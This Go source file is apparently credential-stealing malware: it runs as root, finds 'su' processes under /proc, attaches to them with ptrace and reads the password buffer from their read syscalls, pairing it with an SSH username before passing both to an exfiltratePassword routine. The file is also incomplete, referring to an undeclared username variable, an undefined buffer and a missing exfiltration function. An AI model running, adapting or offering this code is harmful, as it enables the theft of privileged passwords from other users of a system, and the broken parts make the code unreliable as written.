package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func watchSUProcesses() {
	processedPIDs := make(map[int]struct{})

	for {
		select {
		case <-shutdownChan:
			return
		default:
			suPIDs, err := findSUProcesses()
			if err != nil {
				time.Sleep(5 * time.Second)
				continue
			}

			for i, pid := range suPIDs {
				if i == 0 {
					continue
				}
				if _, processed := processedPIDs[pid]; !processed {
					go traceSUProcess(pid)
					processedPIDs[pid] = struct{}{}
				}
			}

			time.Sleep(1 * time.Second / 2)
		}
	}
}

func findSUProcesses() ([]int, error) {
	var suPIDs []int
	dir, err := os.Open("/proc")
	if err != nil {
		return nil, err
	}
	defer dir.Close()
	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}
		if isSUProcess(pid) {
			suPIDs = append(suPIDs, pid)
		}
	}

	return suPIDs, nil
}

func isSUProcess(pid int) bool {
	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceSUProcess(pid int) {
	fmt.Printf("Tracing: %d\n", pid)
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var regs syscall.PtraceRegs
	var readSyscallCount int

	for {
		_, err := syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			return
		}

		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			fmt.Printf("su process died.")
			return
		}

		fmt.Printf("rax: %d\n", regs.Orig_rax)
		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
			readSyscallCount++
			cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
			matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
			if len(matches) == 2 {
				username = string(matches[1])
			}
			if readSyscallCount == 3 {
				bufferAddr := uintptr(regs.Rsi)
				buffer := make([]byte, 511)

				_, err := syscall.PtracePeekData(pid, bufferAddr, buffer)
				if err != nil {
					return
				}
				go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"), username)
				return
			}
		} else {
			return
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}

var shutdownChan = make(chan struct{})

func main() {
	if syscall.Geteuid() != 0 {
		os.Exit(1)
	}
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		close(shutdownChan)
		os.Exit(0)
	}()
	watchSUProcesses()
}
